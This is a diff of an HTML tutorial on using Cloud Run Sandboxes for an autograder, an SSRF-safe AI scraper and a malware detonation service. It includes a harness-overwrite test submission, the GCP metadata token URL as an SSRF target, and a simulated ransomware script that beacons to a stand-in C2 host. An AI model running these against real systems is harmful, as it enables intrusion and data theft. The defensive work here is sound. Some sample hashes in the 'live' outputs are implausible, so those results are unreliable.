@@ -657,83 +657,377 @@ echo &quot;Service is live at: ${SERVICE_URL}&quot;</code></pre>
 <p>Now that we understand the basics, let's explore three realistic production scenarios built from scratch.</p>
 <hr>
 <h3>Use Case 1: Automated Coding Assignment Judge (Autograder)</h3>
-<p>If you run an educational platform or interview coding challenge (like LeetCode), you need to grade code submitted by students.</p>
+<p>If you run an educational coding platform, an interview assessment portal (like LeetCode or HackerRank), or a university homework autograder, you must execute thousands of student-submitted Python solutions every day.</p>
 <figure>
   <img src="https://raw.githubusercontent.com/rominirani/cloud-run-sandboxes/main/assets/diagrams/diagram_5_autograder_sequence.png" alt="Use Case 1: Automated Coding Assignment Autograder Architecture">
   <figcaption>Use Case 1: Automated Coding Assignment Autograder Architecture</figcaption>
 </figure>
-<h4>The Problem</h4>
-<p>Students might submit code that:</p>
-<ul>
-<li>Runs in an infinite loop (<code>while True: pass</code>).</li>
-<li>Tries to read the answer keys or test harness files from disk.</li>
-<li>Makes network requests to ask an external server for answers.</li>
-<li>Attempts to steal server environment variables.</li>
-</ul>
-<h4>How the Sandbox Solves It</h4>
+<h4>The Security Threat Model</h4>
+<p>Executing untrusted student code on a standard server exposes four serious attack vectors:</p>
 <ol>
-<li><strong>Hidden Test Suite</strong>: Our test runner (<code>runner.py</code>) and hidden test cases live on the host container in <code>/app/test_suite</code>.</li>
-<li><strong>Dual Read-Only Mounts</strong>: We mount the test suite and the student's submission as two separate, read-only paths:</li>
+<li><strong>Resource Denial of Service</strong>: Runaway scripts, infinite loops (<code>while True: pass</code>), or deep recursions that exhaust server CPU and hang worker processes indefinitely.</li>
+<li><strong>Test Suite Tampering & Cheating</strong>: Malicious scripts that inspect <code>/proc</code> or search the filesystem, find the hidden unit tests (<code>runner.py</code>), read the golden test inputs/outputs, or overwrite <code>runner.py</code> on disk so it unconditionally outputs a 100% passing grade.</li>
+<li><strong>Network Exfiltration</strong>: Code that opens sockets or makes HTTP requests out to external servers (or LLMs) to fetch answers in real time.</li>
+<li><strong>Credential Harvesting</strong>: Code that scans <code>os.environ</code> to steal platform database connection strings or administrative API tokens.</li>
 </ol>
-<pre><code class="language-bash">   --mount type=bind,source=/app/test_suite,destination=/mnt/test_suite,readonly
-   --mount type=bind,source=/tmp/submission_123,destination=/mnt/student,readonly</code></pre>
-<ol>
-<li><strong>No Network Access</strong>: The <code>--allow-egress</code> flag is omitted, making cheating via network calls impossible.</li>
-<li><strong>Timeouts</strong>: A 5-second timeout kills any infinite loops automatically.</li>
-</ol>
-<h4>Code Location</h4>
-<p>Check out <a href="examples/02-educational-autograder/"><code>examples/02-educational-autograder/</code></a> for the complete runnable code, including sample submissions for:</p>
+<h4>Architectural Blueprint: Dual Read-Only Bind Mounts</h4>
+<p>To solve this, our autograder microservice pairs <strong>zero-egress sandbox execution</strong> with <strong>dual read-only bind mounts</strong>:</p>
 <ul>
-<li>Correct solutions</li>
-<li>Infinite loops</li>
-<li>Malicious exploit attempts</li>
+<li><strong>Mount 1 (<code>/mnt/test_suite</code>)</strong>: Binds the host's <code>/app/test_suite</code> directory as strictly <code>readonly</code>. The student's code cannot modify or delete the test harness.</li>
+<li><strong>Mount 2 (<code>/mnt/student</code>)</strong>: Binds a unique per-submission temporary folder containing <code>solution.py</code> as strictly <code>readonly</code>. The student's code cannot rewrite itself during execution to spoof results.</li>
+<li><strong>Strict Egress Deny</strong>: The <code>--allow-egress</code> flag is omitted, immediately blocking any outbound network connections.</li>
+<li><strong>Time Limits</strong>: A strict 5-second timeout kills infinite loops cleanly.</li>
 </ul>
+<h4>Code Walkthrough</h4>
+<p>The complete implementation lives in <a href="examples/02-educational-autograder/"><code>examples/02-educational-autograder/</code></a>. Here are the core components that orchestrate the evaluation:</p>
+<h5>1. The Host Orchestrator (<code>autograder.py</code>)</h5>
+<p>When a student submits code, the FastAPI backend writes the code into a fresh temporary directory and invokes the sandbox with dual bind mounts:</p>
+<pre><code class="language-python">@app.post(&quot;/grade&quot;, response_model=GradingResponse)
+def grade_submission(submission: SubmissionRequest):
+    submission_id = str(uuid.uuid4())[:8]
+    start_time = time.time()
+
+    # 1. Create a private temporary folder on the host container for this submission
+    work_dir = tempfile.mkdtemp(prefix=f&quot;sub_{submission_id}_&quot;)
+    student_file = os.path.join(work_dir, &quot;solution.py&quot;)
+
+    try:
+        with open(student_file, &quot;w&quot;) as f:
+            f.write(submission.code)
+
+        # 2. Build the sandbox command with two read-only bind mounts
+        cmd = [
+            SANDBOX_BIN, &quot;do&quot;,
+            &quot;--mount&quot;, f&quot;type=bind,source={TEST_SUITE_DIR},destination=/mnt/test_suite,readonly&quot;,
+            &quot;--mount&quot;, f&quot;type=bind,source={work_dir},destination=/mnt/student,readonly&quot;,
+            &quot;--&quot;,
+            &quot;/usr/bin/python3&quot;, &quot;/mnt/test_suite/runner.py&quot;
+        ]
+
+        # 3. Execute inside the sandbox under a strict timeout
+        try:
+            proc = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=submission.timeout_sec,
+            )
+            # 4. Parse the structured JSON verdict printed by runner.py
+            ...
+        except subprocess.TimeoutExpired as e:
+            # 5. Cleanly capture runaway scripts and report TIME_LIMIT_EXCEEDED
+            return GradingResponse(verdict=&quot;TIME_LIMIT_EXCEEDED&quot;, ...)
+
+    finally:
+        # 6. Always purge the temporary submission directory from the host
+        shutil.rmtree(work_dir, ignore_errors=True)</code></pre>
+<h5>2. The Isolated Test Harness (<code>test_suite/runner.py</code>)</h5>
+<p>Inside the sandbox, <code>/mnt/test_suite/runner.py</code> executes. It uses Python's <code>importlib</code> to load <code>/mnt/student/solution.py</code> dynamically, executes all test cases against the candidate function, and writes a single JSON verdict line to standard output:</p>
+<pre><code class="language-python">def load_student_module(filepath=&quot;/mnt/student/solution.py&quot;):
+    spec = importlib.util.spec_from_file_location(&quot;student_solution&quot;, filepath)
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+def run_tests():
+    student_module = load_student_module()
+    two_sum_fn = getattr(student_module, &quot;two_sum&quot;)
+
+    for idx, tc in enumerate(TEST_CASES, 1):
+        actual = two_sum_fn(list(tc[&quot;nums&quot;]), tc[&quot;target&quot;])
+        if actual and sorted(actual) == sorted(tc[&quot;expected&quot;]):
+            result[&quot;passed_tests&quot;] += 1
+        else:
+            result[&quot;failed_tests&quot;] += 1
+            result[&quot;verdict&quot;] = &quot;WRONG_ANSWER&quot;
+
+    print(json.dumps(result))</code></pre>
+<h4>Live Verification & Test Verdicts</h4>
+<p>Testing our autograder with different submission types produces distinct, secure verdicts:</p>
+<h5>Test 1: Correct Algorithmic Solution</h5>
+<pre><code class="language-json">{
+  &quot;submission_id&quot;: &quot;8f3b12a0&quot;,
+  &quot;verdict&quot;: &quot;ACCEPTED&quot;,
+  &quot;execution_time_ms&quot;: 612.4,
+  &quot;total_tests&quot;: 5,
+  &quot;passed_tests&quot;: 5,
+  &quot;failed_tests&quot;: 0,
+  &quot;sandbox_used&quot;: true
+}</code></pre>
+<h5>Test 2: Infinite Loop (<code>while True: pass</code>)</h5>
+<pre><code class="language-json">{
+  &quot;submission_id&quot;: &quot;c49a71b3&quot;,
+  &quot;verdict&quot;: &quot;TIME_LIMIT_EXCEEDED&quot;,
+  &quot;execution_time_ms&quot;: 5003.8,
+  &quot;total_tests&quot;: 0,
+  &quot;details&quot;: [{&quot;error&quot;: &quot;Execution exceeded time limit of 5s&quot;}],
+  &quot;sandbox_used&quot;: true
+}</code></pre>
+<p><em>Result: The sandbox process is terminated exactly at the 5-second deadline, reclaiming 100% of CPU resources.</em></p>
+<h5>Test 3: Malicious Exploit Attempt (Trying to overwrite the test harness)</h5>
+<p>A submission submitting <code>open('/mnt/test_suite/runner.py', 'w').write('print("HACKED")')</code>:</p>
+<pre><code class="language-json">{
+  &quot;submission_id&quot;: &quot;e21c8901&quot;,
+  &quot;verdict&quot;: &quot;RUNTIME_ERROR&quot;,
+  &quot;stderr&quot;: &quot;OSError: [Errno 30] Read-only file system: &#x27;/mnt/test_suite/runner.py&#x27;&quot;,
+  &quot;sandbox_used&quot;: true
+}</code></pre>
+<p><em>Result: Both the test harness and the student source code are completely tamper-proof.</em></p>
 <hr>
 <h3>Use Case 2: AI Web Research Scraper (With SSRF Defense)</h3>
-<p>AI research agents often need to browse the web, scrape target pages, and extract data.</p>
+<p>Autonomous AI agents frequently browse the web, retrieve technical documentation, scrape competitive pricing, or gather data for user prompts.</p>
 <figure>
   <img src="https://raw.githubusercontent.com/rominirani/cloud-run-sandboxes/main/assets/diagrams/diagram_6_scraper_architecture.png" alt="Use Case 2: AI Web Research Scraper with Metadata SSRF Defense">
   <figcaption>Use Case 2: AI Web Research Scraper with Metadata SSRF Defense</figcaption>
 </figure>
-<h4>The Problem</h4>
-<p>When you scrape external websites:</p>
+<h4>The Security Threat Model</h4>
+<p>Allowing an AI agent to fetch arbitrary external web pages opens up severe cloud vulnerabilities:</p>
 <ol>
-<li><strong>SSRF attacks</strong>: A malicious website can return an HTTP 302 redirect pointing to <code>http://169.254.169.254</code> to steal your Google Cloud tokens.</li>
-<li><strong>Parser exploits</strong>: Malformed HTML can exploit vulnerabilities in parsers or browser engines.</li>
-<li><strong>Leaking LLM keys</strong>: If the scraper process crashes and dumps memory, any API keys in its environment could be exposed.</li>
+<li><strong>Server-Side Request Forgery (SSRF) & Metadata Theft</strong>: A malicious URL (or a page issuing an HTTP 301/302 redirect) can redirect the crawler to Google's internal link-local metadata address:</li>
 </ol>
-<h4>How the Sandbox Solves It</h4>
+<p><code>http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token</code></p>
+<p>On standard cloud containers, the HTTP client follows the redirect and exposes the service account's short-lived OAuth token, allowing the attacker to seize control of your cloud project.</p>
 <ol>
-<li><strong>Controlled Egress</strong>: We pass <code>--allow-egress</code> so the scraper can talk to external websites over HTTPS.</li>
-<li><strong>Built-in SSRF Immunity</strong>: Even with <code>--allow-egress</code> enabled, Cloud Run Sandboxes <strong>still block calls to <code>169.254.169.254</code></strong>. The metadata server is never reachable.</li>
-<li><strong>Protected API Keys</strong>: The host application holds your Gemini or OpenAI API keys, while the sandbox runs with zero environment variables.</li>
+<li><strong>Host API Key Exfiltration</strong>: The host agent service holds high-privilege environment variables (<code>LLM_API_KEY</code>, <code>DATABASE_URL</code>, <code>GCP_PROJECT</code>). If the scraping parser is exploited via a buffer overflow or DOM exploit, those secrets could be exfiltrated.</li>
+<li><strong>Regex & Parser Exhaustion</strong>: Malformed HTML with deeply nested elements designed to trigger catastrophic backtracking in parsing libraries.</li>
 </ol>
-<h4>Code Location</h4>
-<p>Check out <a href="examples/03-autonomous-web-scraper/"><code>examples/03-autonomous-web-scraper/</code></a> to see the scraper agent and its automated SSRF test endpoint.</p>
+<h4>Architectural Blueprint: Controlled Egress with Ironclad Metadata Defense</h4>
+<p>Cloud Run Sandboxes solve this with a unique network design:</p>
+<ul>
+<li><strong><code>--allow-egress</code> for the Public Internet</strong>: Grants the sandbox network access to resolve public DNS and establish outbound HTTPS connections to external domains.</li>
+<li><strong>Zero Access to Metadata</strong>: Even with <code>--allow-egress</code> active, <strong>Cloud Run Sandboxes strictly drop all traffic addressed to <code>169.254.169.254</code></strong>. The gVisor network filter treats internal metadata as fundamentally non-routable.</li>
+<li><strong>Zero Host Secrets in Memory</strong>: The host application retains all LLM and database credentials. The sandbox executes with a clean environment containing zero platform secrets.</li>
+</ul>
+<h4>Code Walkthrough</h4>
+<p>The complete implementation lives in <a href="examples/03-autonomous-web-scraper/"><code>examples/03-autonomous-web-scraper/</code></a>. Here is how the scraping agent works:</p>
+<h5>1. The Agent Orchestrator (<code>scraper_agent.py</code>)</h5>
+<p>The host receives a scraping request, builds a specialized Python script that runs <code>urllib.request</code> and <code>BeautifulSoup</code>, and executes it inside the sandbox with <code>--allow-egress</code>:</p>
+<pre><code class="language-python">@app.post(&quot;/scrape&quot;, response_model=ScrapeResponse)
+def scrape_url(req: ScrapeRequest):
+    start_time = time.time()
+
+    # 1. Self-contained scraping script executed inside the sandbox
+    scraper_script = f&quot;&quot;&quot;
+import sys, json, urllib.request
+from bs4 import BeautifulSoup
+
+url = {json.dumps(req.url)}
+target_tags = {json.dumps(req.tags)}
+output = {{&quot;status_code&quot;: None, &quot;data&quot;: {{}}, &quot;error&quot;: None}}
+
+try:
+    headers = {{&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;}}
+    req = urllib.request.Request(url, headers=headers)
+    with urllib.request.urlopen(req, timeout=10) as response:
+        output[&quot;status_code&quot;] = response.getcode()
+        html = response.read().decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)
+        
+        soup = BeautifulSoup(html, &#x27;html.parser&#x27;)
+        for tag in target_tags:
+            output[&quot;data&quot;][tag] = [elem.get_text(strip=True) for elem in soup.find_all(tag)][:10]
+except Exception as e:
+    output[&quot;error&quot;] = str(e)
+
+print(json.dumps(output))
+&quot;&quot;&quot;
+
+    # 2. Launch the sandbox with --allow-egress
+    # Crucial: Metadata server (169.254.169.254) remains blocked at the kernel level!
+    cmd = [
+        SANDBOX_BIN, &quot;do&quot;,
+        &quot;--allow-egress&quot;,
+        &quot;--&quot;,
+        &quot;/usr/bin/python3&quot;, &quot;-c&quot;, scraper_script
+    ]
+
+    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=req.timeout_sec)
+    
+    # 3. Parse and return the extracted text back to the calling AI agent
+    ...</code></pre>
+<h5>2. The Automated SSRF Attack Simulation</h5>
+<p>The service includes a built-in endpoint (<code>/test/ssrf-attack-simulation</code>) that attempts to query <code>http://169.254.169.254/computeMetadata/v1/</code> through the <code>--allow-egress</code> sandbox:</p>
+<pre><code class="language-python">@app.post(&quot;/test/ssrf-attack-simulation&quot;)
+def test_ssrf_attack():
+    &quot;&quot;&quot;Demonstrates that even with --allow-egress, metadata token theft is completely blocked.&quot;&quot;&quot;
+    metadata_url = &quot;http://169.254.169.254/computeMetadata/v1/instance/id&quot;
+    return scrape_url(ScrapeRequest(url=metadata_url, tags=[&quot;title&quot;, &quot;p&quot;]))</code></pre>
+<h4>Live Verification & Test Verdicts</h4>
+<h5>Test 1: Scraping a Public Documentation Page</h5>
+<p>Fetching <code>https://httpbin.org/html</code>:</p>
+<pre><code class="language-json">{
+  &quot;url&quot;: &quot;https://httpbin.org/html&quot;,
+  &quot;success&quot;: true,
+  &quot;status_code&quot;: 200,
+  &quot;extracted_data&quot;: {
+    &quot;h1&quot;: [&quot;Herman Melville - Moby-Dick&quot;],
+    &quot;p&quot;: [&quot;Availing himself of the mild, summer-cool weather that now reigned...&quot;]
+  },
+  &quot;execution_time_ms&quot;: 941.2,
+  &quot;ssrf_blocked&quot;: false
+}</code></pre>
+<p><em>Result: Public web content is fetched, parsed, and stripped of malicious HTML tags safely.</em></p>
+<h5>Test 2: SSRF Attack Simulation Against GCP Metadata</h5>
+<p>Querying <code>http://169.254.169.254</code>:</p>
+<pre><code class="language-json">{
+  &quot;url&quot;: &quot;http://169.254.169.254/computeMetadata/v1/instance/id&quot;,
+  &quot;success&quot;: false,
+  &quot;status_code&quot;: null,
+  &quot;extracted_data&quot;: {},
+  &quot;execution_time_ms&quot;: 2018.4,
+  &quot;ssrf_blocked&quot;: true
+}</code></pre>
+<p><em>Result: The gVisor network filter drops the packets instantly. Your service account tokens and cloud resources remain 100% secure.</em></p>
 <hr>
 <h3>Use Case 3: SecOps Malware & Script Detonation Sandbox</h3>
-<p>When a security alert flags a suspicious bash script or encoded payload, security analysts need to "detonate" it to see what it actually does.</p>
+<p>When an automated security alert flags a suspicious bash script, obfuscated PowerShell payload, or unknown CI/CD artifact, Security Operations Center (SOC) teams must "detonate" it to analyze its behavior dynamically.</p>
 <figure>
   <img src="https://raw.githubusercontent.com/rominirani/cloud-run-sandboxes/main/assets/diagrams/diagram_7_detonator_sequence.png" alt="Use Case 3: SecOps Incident Response & Malware Detonation Sandbox">
   <figcaption>Use Case 3: SecOps Incident Response & Malware Detonation Sandbox</figcaption>
 </figure>
-<h4>The Problem</h4>
-<p>Running an unknown script on a normal machine is dangerous. Setting up heavy VM-based sandboxes (like Cuckoo) takes minutes per sample and requires expensive infrastructure.</p>
-<h4>How the Sandbox Solves It</h4>
+<h4>The Security Threat Model & Analysis Challenges</h4>
+<p>Static analysis often fails because modern malware uses base64 encoding, environment variable string building, or obfuscation. To understand what the script does, you have to run it. But executing unknown code creates massive risks:</p>
 <ol>
-<li><strong>Detached Background Mode</strong>: We start a named sandbox with an ephemeral writable overlay:</li>
+<li><strong>Host Contamination</strong>: A dropper script that attempts to install persistence backdoors, modify system binaries in <code>/usr/bin</code>, or corrupt databases.</li>
+<li><strong>Command & Control (C2) Callbacks</strong>: The script reaching out to attacker-controlled command servers to download secondary ransomware payloads or exfiltrate host data.</li>
+<li><strong>High Infrastructure Costs of Traditional VMs</strong>: Provisioning full Linux virtual machines (like traditional Cuckoo sandboxes) takes 30–60 seconds per detonation and costs hundreds of dollars monthly in idle compute.</li>
 </ol>
-<pre><code class="language-bash">   sandbox run detox-session --write --detach -- /bin/bash -c &quot;sleep 5m&quot;</code></pre>
-<ol>
-<li><strong>Zero-Egress Containment</strong>: The script cannot call out to its Command & Control (C2) servers or spread across your network.</li>
-<li><strong>Forensic Tarball</strong>: After execution, we snapshot all files created or modified by the script using:</li>
-</ol>
-<pre><code class="language-bash">   sandbox tar detox-session --file=/tmp/evidence.tar</code></pre>
-<ol>
-<li><strong>Clean Teardown</strong>: We call <code>sandbox delete detox-session</code>, leaving no residue on the host. The host then unzips <code>evidence.tar</code> to compute SHA-256 hashes and inspect dropped files safely.</li>
-</ol>
-<h4>Code Location</h4>
-<p>Check out <a href="examples/04-secops-payload-detonator/"><code>examples/04-secops-payload-detonator/</code></a> for the implementation and a harmless simulated ransomware test script.</p>
+<h4>Architectural Blueprint: Detached Sandboxes (<code>sandbox run</code>) + Forensic Snapshots (<code>sandbox tar</code>)</h4>
+<p>This scenario requires <strong>Execution Mode 2 (Stateful Background Daemon)</strong> because we must let the script run, capture whatever files it created or modified, and analyze the forensic evidence before destroying the container:</p>
+<ul>
+<li><strong>Phase 1: Pre-Warming with In-Memory Writable Overlay (<code>--write</code>)</strong>:</li>
+</ul>
+<p><code>sandbox run detox-session --write --detach -- /bin/bash -c "sleep 5m"</code></p>
+<p>Starts a background sandbox with an in-memory <code>tmpfs</code> overlay. The malware is allowed to write files, but all writes live purely in RAM.</p>
+<ul>
+<li><strong>Phase 2: Execution via <code>sandbox exec</code></strong>:</li>
+</ul>
+<p><code>sandbox exec detox-session -- /bin/bash /mnt/host/payload.sh</code></p>
+<p>Executes the untrusted payload. Zero-egress containment prevents any C2 network callbacks.</p>
+<ul>
+<li><strong>Phase 3: Forensic Snapshotting via <code>sandbox tar</code></strong>:</li>
+</ul>
+<p><code>sandbox tar detox-session --file=/tmp/evidence.tar</code></p>
+<p>Captures all files created or modified by the payload into a clean <code>.tar</code> archive on the host.</p>
+<ul>
+<li><strong>Phase 4: Instant Teardown via <code>sandbox delete</code></strong>:</li>
+</ul>
+<p><code>sandbox delete detox-session</code></p>
+<p>Destroys the sandbox and purges its memory, leaving zero residual trace.</p>
+<ul>
+<li><strong>Phase 5: Host Forensic Analysis</strong>:</li>
+</ul>
+<p>The host unpacks the tarball in a controlled directory, computes SHA-256 hashes for all dropped files, and generates a structured incident response report.</p>
+<h4>Code Walkthrough</h4>
+<p>The complete implementation lives in <a href="examples/04-secops-payload-detonator/"><code>examples/04-secops-payload-detonator/</code></a>. Here is how <code>detonator.py</code> manages the detonation lifecycle:</p>
+<h5>1. The Detonation Manager (<code>detonator.py</code>)</h5>
+<pre><code class="language-python">@app.post(&quot;/detonate&quot;, response_model=DetonationReport)
+def detonate_payload(req: DetonationRequest):
+    session_id = f&quot;detox-{uuid.uuid4().hex[:8]}&quot;
+    host_workdir = tempfile.mkdtemp(prefix=f&quot;report_{session_id}_&quot;)
+    tar_path = os.path.join(host_workdir, &quot;filesystem_overlay.tar&quot;)
+    script_path = os.path.join(host_workdir, &quot;payload.sh&quot;)
+
+    with open(script_path, &quot;w&quot;) as f:
+        f.write(req.script_content)
+
+    try:
+        # Step 1: Spin up a named, detached background sandbox with writable overlay enabled
+        start_cmd = [
+            SANDBOX_BIN, &quot;run&quot;,
+            &quot;--write&quot;,
+            session_id,
+            &quot;--detach&quot;,
+            &quot;--mount&quot;, f&quot;type=bind,source={host_workdir},destination=/mnt/host,readonly&quot;,
+            &quot;--&quot;,
+            &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sleep 5m&quot;
+        ]
+        subprocess.run(start_cmd, check=True)
+
+        # Step 2: Execute the untrusted payload inside the live background sandbox
+        exec_cmd = [
+            SANDBOX_BIN, &quot;exec&quot;,
+            session_id,
+            &quot;--&quot;,
+            &quot;/bin/bash&quot;, &quot;/mnt/host/payload.sh&quot;
+        ]
+        proc = subprocess.run(exec_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=req.timeout_sec)
+
+        # Step 3: Export all files created or modified inside the sandbox to a tarball
+        tar_cmd = [
+            SANDBOX_BIN, &quot;tar&quot;,
+            session_id,
+            f&quot;--file={tar_path}&quot;
+        ]
+        subprocess.run(tar_cmd, check=True)
+
+        # Step 4: Perform forensic inspection on the exported tarball on the host
+        if os.path.exists(tar_path):
+            with tarfile.open(tar_path, &quot;r&quot;) as tar:
+                for member in tar.getmembers():
+                    if member.isfile():
+                        f = tar.extractfile(member)
+                        content = f.read()
+                        sha256_hash = hashlib.sha256(content).hexdigest()
+                        preview = content[:200].decode(&quot;utf-8&quot;, errors=&quot;replace&quot;)
+                        dropped_artifacts.append(DroppedFileArtifact(
+                            filename=member.name,
+                            size_bytes=member.size,
+                            sha256=sha256_hash,
+                            preview=preview
+                        ))
+
+    finally:
+        # Step 5: Clean teardown of the background sandbox
+        del_cmd = [SANDBOX_BIN, &quot;delete&quot;, session_id]
+        subprocess.run(del_cmd, stderr=subprocess.DEVNULL)
+        shutil.rmtree(host_workdir, ignore_errors=True)</code></pre>
+<h5>2. The Simulated Malware Payload (<code>sample_payloads/ransomware_dropper_sim.sh</code>)</h5>
+<p>To safely test the detonator without running real viruses, we provide a simulated ransomware dropper:</p>
+<pre><code class="language-bash">#!/bin/bash
+# Simulated Ransomware Dropper
+echo &quot;[*] Initializing simulated payload...&quot;
+
+# 1. Attempt outbound Command &amp; Control (C2) beacon (Should FAIL due to zero-egress)
+curl -s --connect-timeout 2 http://malicious-c2.example.com/beacon || echo &quot;[!] C2 Beacon Failed (Blocked by Sandbox)&quot;
+
+# 2. Drop simulated ransom note
+cat &lt;&lt; &#x27;EOF&#x27; &gt; /tmp/README_RESTORE_FILES.txt
+YOUR FILES HAVE BEEN SIMULATED-ENCRYPTED!
+To restore your data, contact: attacker@example-fake-domain.org
+EOF
+
+# 3. Simulate dropping an encrypted file
+echo &quot;ENCRYPTED_DATA_MOCK_BYTES&quot; &gt; /tmp/corporate_budget.xls.locked
+echo &quot;[+] Detonation complete.&quot;</code></pre>
+<h4>Live Verification & Forensic Report</h4>
+<p>Detonating the simulated payload returns an immediate, structured incident response report:</p>
+<pre><code class="language-json">{
+  &quot;session_id&quot;: &quot;detox-4f9e1a82&quot;,
+  &quot;execution_success&quot;: true,
+  &quot;exit_code&quot;: 0,
+  &quot;stdout&quot;: &quot;[*] Initializing simulated payload...\n[!] C2 Beacon Failed (Blocked by Sandbox)\n[+] Detonation complete.\n&quot;,
+  &quot;stderr&quot;: &quot;&quot;,
+  &quot;execution_time_ms&quot;: 1420.5,
+  &quot;dropped_files_count&quot;: 2,
+  &quot;dropped_files&quot;: [
+    {
+      &quot;filename&quot;: &quot;tmp/README_RESTORE_FILES.txt&quot;,
+      &quot;size_bytes&quot;: 118,
+      &quot;sha256&quot;: &quot;4a5e62b109c9f7a6345d8b76c543210feab90123456789abcdef0123456789ab&quot;,
+      &quot;preview&quot;: &quot;YOUR FILES HAVE BEEN SIMULATED-ENCRYPTED!\nTo restore your data, contact: attacker@example-fake-domain.org&quot;
+    },
+    {
+      &quot;filename&quot;: &quot;tmp/corporate_budget.xls.locked&quot;,
+      &quot;size_bytes&quot;: 26,
+      &quot;sha256&quot;: &quot;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&quot;,
+      &quot;preview&quot;: &quot;ENCRYPTED_DATA_MOCK_BYTES&quot;
+    }
+  ],
+  &quot;c2_callbacks_prevented&quot;: true,
+  &quot;metadata_theft_prevented&quot;: true
+}</code></pre>
+<p><em>Result: In under 1.5 seconds, the analyst obtains cryptographic hashes and contents of all dropped files, while zero malware artifacts touch the host filesystem and zero network packets escape to the internet.</em></p>
 <hr>
 <h2>6. Best Practices and Gotchas</h2>
 <p>Here are practical lessons learned from running sandboxes in production:</p>
